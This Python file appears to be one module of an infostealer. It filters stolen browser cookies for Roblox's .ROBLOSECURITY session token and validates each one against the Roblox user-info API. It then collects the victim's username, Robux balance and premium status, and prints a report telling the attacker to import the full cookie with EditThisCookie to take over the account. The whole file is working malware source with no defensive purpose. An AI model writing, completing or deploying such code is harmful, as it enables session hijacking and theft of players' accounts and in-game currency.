import os
import requests
import re
import json

def get_roblox_info(cookie):
    try:
        headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
        info = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers, timeout=10).json()
        
        user_id = info.get('UserID', 'Unknown')
        username = info.get('UserName', 'Unknown')
        robux = info.get('RobuxBalance', 0)
        is_premium = info.get('IsPremium', False)
        
        return {
            "ID": user_id,
            "Username": username,
            "Robux": robux,
            "Premium": is_premium,
            "Cookie": cookie
        }
    except:
        return {"Cookie": cookie}

def extract_roblox_cookies(all_cookies_json):
    roblox_accounts = []
    # Roblox uses .ROBLOSECURITY cookie for authentication
    for cookie in all_cookies_json:
        if cookie.get('name') == '.ROBLOSECURITY' and 'roblox.com' in cookie.get('host', ''):
            val = cookie.get('value')
            if val and val not in [a.get('Cookie') for a in roblox_accounts]:
                info = get_roblox_info(val)
                roblox_accounts.append(info)
    return roblox_accounts

def format_roblox_report(accounts):
    if not accounts:
        return None
    
    report = "╔════════════════════════════════════════╗\n"
    report += "║            ROBLOX ACCOUNTS             ║\n"
    report += "╠════════════════════════════════════════╣\n"
    
    for acc in accounts:
        report += f"║ USER: {str(acc.get('Username', 'Unknown')).ljust(22)} ║\n"
        report += f"║ ROBUX: {str(acc.get('Robux', 0)).ljust(21)} ║\n"
        report += f"║ PREMIUM: {str(acc.get('Premium', False)).ljust(19)} ║\n"
        report += f"║ COOKIE: {acc.get('Cookie')[:20]}... ║\n"
        report += "╠════════════════════════════════════════╣\n"
    
    report += "\n[!] Use EditThisCookie to import full cookie value.\n"
    report += "╚════════════════════════════════════════╝"
    return report

def get_roblox_data(all_cookies=None):
    if not all_cookies:
        return None
    accounts = extract_roblox_cookies(all_cookies)
    return format_roblox_report(accounts)
